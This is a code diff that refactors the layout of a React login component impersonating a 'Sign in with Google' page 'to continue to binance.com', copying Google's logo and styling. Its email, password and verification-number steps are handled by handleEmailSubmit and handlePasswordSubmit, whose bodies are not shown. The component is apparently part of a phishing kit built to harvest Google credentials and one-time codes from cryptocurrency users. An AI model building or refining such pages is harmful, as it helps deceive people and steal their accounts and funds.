@@ -99,62 +99,62 @@ export default function LoginForm() {
                 <div class="w-full flex opacity-100 items-center px-4 pt-4 pb-3 border-b border-[#c4c7c5]"><svg class="th8JXc mr-[12px]" xmlns="https://www.w3.org/2000/svg" width="20" height="24" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg><div class="google mt-1 text-sm">Sign in with Google</div></div>
 
                 {/* Form Box */}
-                <div className={`w-full px-[24px] ${isLoading ? 'opacity-50 pointer-events-none' : 'opacity-100'} sm:pt-[31px] sm:pb-[24px] flex flex-col`}>
-                    <div className='justify-between flex-col p-[24px] sm:p-0 gap-y-2 lg:gap-y-8 lg:flex-row flex w-full'>
-                        {/* ... existing left side ... */}
-                        <div>
-                        <div className="h-[48px] w-[48px]">
-                            <img 
-                            src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" 
-                            className="dJRqtd TrZEUc" 
-                            alt="binance.com"
-                            />
+                <div className="responsive-form-container bg-white rounded-[28px] shadow-sm">
+                    <div className="responsive-form-padding">
+                        <div className="responsive-form-grid">
+                            {/* Left Side */}
+                            <div className="flex flex-col justify-center">
+                                <div className="responsive-spacing">
+                                    <div className="h-12 w-12 sm:h-16 sm:w-16">
+                                        <img 
+                                            src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" 
+                                            alt="binance.com"
+                                            className="w-full h-full"
+                                        />
+                                    </div>
+                                    <h1 className="responsive-header google">Sign in</h1>
+                                    <p className="responsive-text google">
+                                        to continue to 
+                                        <a href="#" className="text-blue-700"> binance.com</a>
+                                    </p>
+                                </div>
+                            </div>
+
+                            {/* Right Side - Form */}
+                            <div className="w-full">
+                                <GoogleForm 
+                                    currentStep={currentStep}
+                                    email={email}
+                                    setEmail={setEmail}
+                                    password={password}
+                                    setPassword={setPassword}
+                                    invalid={invalid}
+                                    verificationNumber={verificationNumber}
+                                />
+                            </div>
                         </div>
-                        
-                        <div className="mt-6">
-                            <h1 className="lg:text-4xl text-[28px] google">Sign in</h1>
-                            <p className="mt-[19px] google">
-                            to continue to 
-                            <a href="#" className="text-blue-700"> binance.com</a>
-                            </p>
-                        </div>
-                    </div>
-                        
-                        
-                        
-                        <div className='w-[425px] pt-8'>
-                            <GoogleForm 
-                                currentStep={currentStep}
-                                email={email}
-                                setEmail={setEmail}
-                                password={password}
-                                setPassword={setPassword}
-                                invalid={invalid}
-                                verificationNumber={verificationNumber}
-                            />
-                        </div>
-                    </div>
-                    <div className='w-full flex justify-end text-sm mt-[40px] sm:px-0 px-[24px]'>
-                        <div className='flex gap-x-10 w-full justify-between lg:w-fit'>
-                            <button className='text-blue-700 font-medium google text-sm'>
+
+                        {/* Footer Buttons */}
+                        <div className="responsive-footer mt-8">
+                            <button className="responsive-button text-blue-700 font-medium google">
                                 Create account
                             </button>
                             <button 
-                                    className='py-2.5 px-6 text-sm google rounded-full bg-blue-700 text-white' 
-                                    onClick={() => {
-                                        if (currentStep === 'email') {
-                                            handleEmailSubmit();
-                                        } else if (currentStep === 'password') {
-                                            handlePasswordSubmit();
-                                        } else {
-                                            showLoader();
-                                        }
-                                    }}
-                                >
-                                    {currentStep === 'email' ? 'Next' : 
-                                    currentStep === 'password' ? 'Sign in' : 
-                                    'Next'}
-                                </button>
+                                className="responsive-button bg-blue-700 text-white rounded-full"
+                                onClick={() => {
+                                    if (currentStep === 'email') {
+                                        handleEmailSubmit();
+                                    } else if (currentStep === 'password') {
+                                        handlePasswordSubmit();
+                                    } else {
+                                        showLoader();
+                                    }
+                                }}
+                            >
+                                {currentStep === 'email' ? 'Next' : 
+                                currentStep === 'password' ? 'Sign in' : 
+                                'Next'}
+                            </button>
                         </div>
                     </div>
                 </div>
